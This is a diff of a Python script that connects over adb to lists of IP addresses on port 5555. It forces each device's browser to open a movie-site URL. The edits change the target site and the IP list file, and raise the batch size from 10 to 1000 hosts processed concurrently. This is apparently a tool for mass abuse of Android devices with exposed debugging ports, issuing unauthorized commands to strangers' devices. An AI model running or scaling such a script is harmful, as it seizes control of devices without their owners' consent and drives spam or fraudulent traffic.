@@ -40,7 +40,7 @@ def execute_adb_command(ip):
 
   adb_command_open_browser = [
       "adb", "-s", f"{ip}:5555", "shell", "am", "start", "-a",
-      "android.intent.action.VIEW", "-d", "https://flix-movie-homepage.pages.dev/"
+      "android.intent.action.VIEW", "-d", "https://movievip.pages.dev"
   ]
 
   try:
@@ -115,14 +115,14 @@ def load_ips(file_path):
 
 
 def main():
-  ip_files = ['AllADB.txt']
+  ip_files = ['IP.txt']
 
   all_ips = []
   for ip_file in ip_files:
     ips = load_ips(ip_file)
     all_ips.extend(ips)
 
-  grouped_ips = [all_ips[i:i + 10] for i in range(0, len(all_ips), 10)]
+  grouped_ips = [all_ips[i:i + 1000] for i in range(0, len(all_ips), 1000)]
 
   with concurrent.futures.ThreadPoolExecutor() as executor:
     futures = [
